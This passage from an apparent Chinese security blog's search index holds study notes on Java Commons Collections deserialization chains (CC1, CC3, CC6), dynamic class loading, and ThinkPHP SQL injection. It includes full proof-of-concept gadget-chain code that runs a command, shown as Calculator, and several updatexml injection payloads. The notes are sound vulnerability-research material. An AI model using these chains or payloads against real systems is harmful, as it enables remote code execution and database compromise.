tc.getDeclaredField(\"_name\"); nameField.setAccessible(true); nameField.set(templatesImpl,\"test\"); Field bytecodesField = tc.getDeclaredField(\"_bytecodes\"); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); byte[][] codes = {code}; bytecodesField.set(templatesImpl,codes); Field tfactoryField = tc.getDeclaredField(\"_tfactory\"); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); templatesImpl.newTransformer(); } } Test.java import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { { try { Runtime.getRuntime().exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); } catch (IOException e) { throw new RuntimeException(e); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 通过上面的例子，我们只需要调用到newTransformer()方法即可，回想 CC1链是有任意类任意方法调用的，所以直接把 CC1 复制过来 package org.example.CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; public class CommonsCollections3 { public static void main(String[] args) throws Exception{ TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\"_name\"); nameField.setAccessible(true); nameField.set(templatesImpl,\"test\"); Field bytecodesField = tc.getDeclaredField(\"_bytecodes\"); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); byte[][] codes = {code}; bytecodesField.set(templatesImpl,codes); Field tfactoryField = tc.getDeclaredField(\"_tfactory\"); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(templatesImpl), new InvokerTransformer(\"newTransformer\",null,null) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e lazymap = LazyMap.decorate(map,chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap); Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap); //serialize(o); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-16","objectID":"/commonscollections3%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:0","tags":["CommonsCollections"],"title":"CommonsCollections3链详解","uri":"/commonscollections3%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" 另一条上面的例子可以得知是InvokerTransformer类的transformer调用了TemplateImpl类的newTransformer()方法才得以执行的，这里再找一个其他类调用newTransformer()方法 在TrxAXFilter类的构造器中调用了newTransformer()方法，但是TrxAXFilter类无法被序列化，所以找一个可以被序列化的类来调用TrxAXFilter类的构造器，这里选择了InstantiateTransformer类中的transformer()方法，来调用上面的构造器从而调用到newTransformer()方法 构造poc package org.example.CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; public class CommonsCollections3 { public static void main(String[] args) throws Exception{ TemplatesImpl templatesImpl = new TemplatesImpl(); Class tc = templatesImpl.getClass(); Field nameField = tc.getDeclaredField(\"_name\"); nameField.setAccessible(true); nameField.set(templatesImpl,\"test\"); Field bytecodesField = tc.getDeclaredField(\"_bytecodes\"); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); byte[][] codes = {code}; bytecodesField.set(templatesImpl,codes); Field tfactoryField = tc.getDeclaredField(\"_tfactory\"); tfactoryField.setAccessible(true); tfactoryField.set(templatesImpl,new TransformerFactoryImpl()); InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl}); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e lazymap = LazyMap.decorate(map,chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap); Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap); //serialize(o); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-16","objectID":"/commonscollections3%E9%93%BE%E8%AF%A6%E8%A7%A3/:2:0","tags":["CommonsCollections"],"title":"CommonsCollections3链详解","uri":"/commonscollections3%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" 类加载与反序列化类加载的时候会执行代码 初始化：静态代码快 实例化：构造代码快、无参构造函数 ","date":"2024-01-16","objectID":"/java-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/:1:0","tags":["CommonsCollections"],"title":"Java 动态类加载","uri":"/java-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/"},{"categories":["Java"],"content":" 动态类加载方法Class.forname 初始化/不初始化 ClassLoader.loadClass不进行初始化 底层的原理，实现加载任意的类 URLClassLoader任意类加载：file/http/jar URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\"http://localhost:9080/\")}); Class\u003c?\u003e c = urlClassLoader.loadClass(\"Test\"); c.newInstance(); ClassLoader.defineClass字节码加载任意类 私有 ClassLoader cl = ClassLoader.getSystemClassLoader(); Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); Class c= (Class) defineClassMethod.invoke(cl,\"Test\",code,0,code.length); c.newInstance(); Unsafe.defineClass字节码加载 public类不能直接生成 Spring 里面可以直接生成 ClassLoader cl = ClassLoader.getSystemClassLoader(); Class c = Unsafe.class; Field theUnsafeField = c.getDeclaredField(\"theUnsafe\"); theUnsafeField.setAccessible(true); Unsafe unsafe = (Unsafe) theUnsafeField.get(null); byte[] code = Files.readAllBytes(Paths.get(\"/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/LoaderDemo/Test.class\")); Class c2 = unsafe.defineClass(\"Test\",code,0,code.length,cl,null); c2.newInstance(); ","date":"2024-01-16","objectID":"/java-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/:2:0","tags":["CommonsCollections"],"title":"Java 动态类加载","uri":"/java-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/"},{"categories":["PHP"],"content":" ThinkPHP 5基础以ThinkPHP5.1.x版本为例 composer create-project topthink/think=5.1.36 thinkphp5.1.36 ThinkPHP5.1完全开发手册 先来了解目录架构，这里直接看手册 https://www.kancloud.cn/manual/thinkphp5_1/353950 ","date":"2024-01-15","objectID":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:1:0","tags":["ThinkPHP"],"title":"ThinkPHP5漏洞学习","uri":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 访问模式5.1的 URL 访问受路由决定，如果在没有定义或匹配路由的情况下(并且没有开启强制路由)，则基于 /index.php（或者其它入口文件）/模块/控制器/操作/参数/值… ","date":"2024-01-15","objectID":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:1:1","tags":["ThinkPHP"],"title":"ThinkPHP5漏洞学习","uri":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 请求参数继承了控制器基类think\\Controller直接使用this-\u003erequest-\u003eparam('name');来获取请求参数 Facade调用Request::param('name'); 助手函数request()-\u003eparam('name'); ","date":"2024-01-15","objectID":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:1:2","tags":["ThinkPHP"],"title":"ThinkPHP5漏洞学习","uri":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 漏洞详解parseWhereItem未过滤处理where查询表达式 漏洞 Demo public function sqlDemo(){ $username = request()-\u003eget('username'); $result1 = db('user')-\u003ewhere('username','exp',$username)-\u003eselect(); } Poc ) union select 1,2,updatexml(1,concat(1,user(),1),1)--+ debug断点调试，跟进where()方法 这里跟进parseWhereExp()方法， 利用whereExp来处理传入的$username，继续跟进whereExp()方法 进行了赋值之后，直接返回， 便进入到select()方法里面，和ThinkPHP3 SQL 注入有类似之处，这里直接进入parseWhere()方法里面进行了返回 然后进行了一系列操作之后，就直接执行了。 ","date":"2024-01-15","objectID":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:0","tags":["ThinkPHP"],"title":"ThinkPHP5漏洞学习","uri":"/thinkphp5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["Java"],"content":"世界上最好用的 CC 链 ","date":"2024-01-15","objectID":"/commonscollections6%E9%93%BE%E8%AF%A6%E8%A7%A3/:0:0","tags":["CommonsCollections"],"title":"CommonsCollections6链详解","uri":"/commonscollections6%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" CommonsCollections6 详解CommonsCollections1 的链子调用了LazyMap类中的transform()方法，于是找一个任意类调用get()方法的地方，这里换到了TideMapEntry类 这里的hashCode()方法里调用了getValue()方法里面调用了get()方法，并且map可控，这里的hashCode()很熟悉，因为在URLDNS链中HashMap类里的readObject()方法调用到了hashCode()方法 于是构造poc package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollections6 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e lazymap = LazyMap.decorate(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, \"test\"); HashMap\u003cObject, Object\u003e map2 = new HashMap\u003c\u003e(); map2.put(tiedMapEntry,\"test1\"); lazymap.remove(\"test\"); Class c = LazyMap.class; Field factoryField = c.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(lazymap,chainedTransformer); //serialize(map2); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-15","objectID":"/commonscollections6%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:0","tags":["CommonsCollections"],"title":"CommonsCollections6链详解","uri":"/commonscollections6%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":null,"content":"N1Rvana's introduction","date":"2024-01-15","objectID":"/about/","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":" About MeSU Team of member 某不知名三本院校大一在读 ","date":"2024-01-15","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":" My CVEs CVE-ID Porject CVE-2022-2886 Laravel CVE-2022-2870 Laravel CVE-2022-33107 ThinkPHP ","date":"2024-01-15","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"N1Rvana's friends","date":"2024-01-15","objectID":"/friends/","tags":null,"title":"Index","uri":"/friends/"},{"categories":null,"content":" Base info - nickname: N1rvana avatar: https://nlrvana.github.io/avatar.png url: https://nlrvana.github.io/ 交换友链，请按上述格式发送至beichenghua@gmail.com ","date":"2024-01-15","objectID":"/friends/:1:0","tags":null,"title":"Index","uri":"/friends/"},{"categories":["PHP"],"content":"ThinkPHP 漏洞学习 环境搭建ThinkPHP3 composer create-project topthink/thinkphp=版本号 文件名 ThinkPHP5(完整版) composer create-project topthink/think=版本号 文件名 阿里云 Compose 全量镜像资源库 composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/ https://www.runoob.com/w3cnote/composer-install-and-usage.html https://packagist.org/ 框架了解审计之前，我们需要了解框架的信息 ThinkPHP3.2.3完全开发手册 composer create-project topthink/thinkphp=3.2.3 thinkphp3.2.3 index.php 入口文件 Application 应用目录 Public 资源文件目录 ThinkPHP 框架目录 其中框架目录ThinkPHP的结构如下 Common 核心公共函数目录 Conf 核心配置目录 Lang 核心语言包目录 Library 核心类库目录 Think 核心Think类库目录 Behavior 行为类库目录 Org Org类库目录 Vendor 第三方类库目录 ... 更多类库目录 Mode 框架应用模式目录 Tpl 系统模板目录 ThinkPHP.php 框架入口文件 其中Application目录如下 Common 应用公共模块 Common 应用公共函数目录 Conf 应用公共配置文件目录 Home 默认生成的Home模块 Conf 模块配置文件目录 Common 模块函数公共目录 Controller 模块控制器目录 Model 模块模型目录 View 模块视图文件目录 Runtime 运行时目录 Cache 模板缓存目录 Data 数据目录 Logs 日志目录 Temp 缓存目录 ","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:0:0","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 路由信息thinkphp3使用 URL 模式切换：普通 GET 模式、pathinfo、rewrite 和兼容模式 /ThinkPHP/Conf/convention.php return array( \"URL_MODEL\" =\u003e 1 //URL模式:0(普通模式) 1(PATHINFO 模式) 2(REWRITE模式) 3(兼容模式) //静态路由 \"URL_ROUTE_ON\" =\u003e fasle, \"URL_ROUTE_RULES\" =\u003e array() ) 历史漏洞","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:1:0","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" SQL 注入","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:0","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 0x01 聚合查询功能count方法未过滤调用parseKey 利用条件ThinkPHP[5.0.0,5.0.23]，ThinkPHP 3 全版本 ","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:1","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 漏洞分析和原理ThinkPHP3.2.3 漏洞 demo public function SqlDemo(){ $field = I('get.field'); $num = M('user')-\u003ecount($field); //M('user') 相当于 new Think\\Model('user') var_dump($num); } poc ?field=id),updatexml(1,concat(1,user(),1),1)from+user%23 在这里打个断点，跟进 会进入到ThinkPHP/Library/Think/Model.class.php中的__call方法中， 因为是count，所以进入到$this-\u003egetField()方法 经过对传入字段进行解析等一系列操作之后， 进入到$this-\u003edb-\u003eselect()方法中 此时传入的$options变成了 继续跟进，这里进入到了$this-\u003ebuildSelectSql()方法，来构建 select 语句 进入到$this-\u003eparseSql()方法中 利用$this-\u003eparseField()方法进行解析，继续跟进 这里的$this-\u003eparseKey()对传入的 payload 并没有进行过滤 然后便回到$this-\u003eparseField()方法中，返回构建的 field 语句 最终回到$this-\u003eparseSql()方法中，返回最终需要执行的 sql 语句 最后得到了执行 ","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:2","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["PHP"],"content":" 0x02 _parseOptions未过滤$options导致 sql 注入 利用条件ThinkPHP \u003c= 3.2.3 漏洞原理和分析$options查询条件可以不经过数据处理直接进入_parseOptions，再进入Driver.class.php的sql操作函数，和上面一样通过buildSelectsql方法或直接调用delete方法进行拼接 sql 语句，然后再进行执行 漏洞 Demo public function SqlDemo() { $id = I('id'); $res = M('user')-\u003eselect($id); $res = M('user')-\u003efind($id); } poc id[comment]=\\*/where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)/\\* id[limit]=1,1+procdure+analyse(updatexml(1,concat(0x7e,user(),0x7e),1),1)-- id[field]=* from user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1) --+ 具体构造出多少个poc，可以看pasexxx有多少个 ","date":"2024-01-15","objectID":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/:2:3","tags":["ThinkPHP"],"title":"ThinkPHP3.2.3漏洞学习","uri":"/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"},{"categories":["Java"],"content":"比较难一点的CC链 CommonsCollections1链详解jdk8源码下载 https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 漏洞触发点在org.apache.commons.collections.functors.InvokerTransformer 其中的transform()方法 很明显的一个反射调用，其中iMethodName、iParamTypes、iArgs都是可控的变量，便可以调用任意方法和任意参数 看一下构造器是如何赋值的 构造一个简单的 payload 试试 new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}).transform(Runtime.getRuntime()); 找一个任意类调用transforms()方法的方法，这里选择org.apache.commons.collections.map.TransformedMap类的checkSetValue()方法 valueTransformer变量可控 但是因为构造器是protected修饰，所以无法直接调用，利用这里的静态方法decorate()进行了调用 再查看一下哪里调用了checkSetValue()方法，只有这一处 setValue()方法调用了checkSetValue()，构造一个payload，看看能不能通 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); map.put(\"key\",\"value\"); Map\u003cObject,Object\u003e transformedMap = TransformedMap.decorate(map,null,invokerTransformer); for(Map.Entry entry:transformedMap.entrySet()){ entry.setValue(r); 接着找一个setValue()方法的调用，在sun.reflect.annotation.AnnotationInvocationHandler类中，找到了如下方法 这里调用了setValue()方法，并且还在readObject()方法中，继续构造poc Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); map.put(\"key\",\"value\"); Map\u003cObject,Object\u003e transformedMap = TransformedMap.decorate(map,null,invokerTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor annotationInvocationhandleconstructor = c.getDeclaredConstructor(Class.class,Map.class); annotationInvocationhandleconstructor.setAccessible(true); Object o = annotationInvocationhandleconstructor.newInstance(Target.class,transformedMap); 但是这里存在两个问题 第一个问题是Runtime没有实现Seriablable接口，无法参与序列化过程 利用反射来解决，这里再利用一个ChainedTransformer.transform方法 简单来说就是上一个执行transform方法返回的结果作为下一个执行transform方法输入 Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 还有一个问题，无法控制setValue()里面的参数值 这里利用org.apache.commons.collections.functors.ConstantTransformer的transform()方法，无论传入什么，都会返回固定的值 所以完善一下上面的poc Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 于是完整的poc如下 package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonsCollection1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); InvokerTransformer invokerTransformer =new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); map.put(\"value\",\"value\"); Map\u003cObject,Object\u003e transformedMap = TransformedMap.decorate(map,null,chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap); serialize(o); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } 整个调用栈如下 注 这里为什么要用Target Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap); 因为Target中有值是value 这里的getKey()获取的就是，上面map.put()放入的key值 map.put(\"value\",\"value\"); key放入value，正好能取出Target中的值，所以就绕过了if条件 ","date":"2024-01-14","objectID":"/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/:0:0","tags":["CommonsCollections"],"title":"CommonsCollections1链详解","uri":"/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" 另一条在上面选择任意类执行transform方法的时候，选择了TransformedMap 这次选择另一个类LazyMap中的get()方法 再看一下哪里调用了get()方法，恰好在AnnotationInocationHandler类中的invoke()方法中调用了get()方法 而恰好memberValues也是可控的，那如何调用到invoke()方法呢？ 这里需要一个新的知识点，动态代理，将AnnoationInvocationHandler动态代理，执行任意方法，即可调用到invoke方法，但是根据 invoke 中的if条件，执行的任意方法必须是无参的，恰好在AnnotationInvocationHandler类中的readObject()方法中，有这样的方法存在 于是根据上面的poc修改一下 package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e lazymap = LazyMap.decorate(map,chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap); Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap); serialize(o); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = 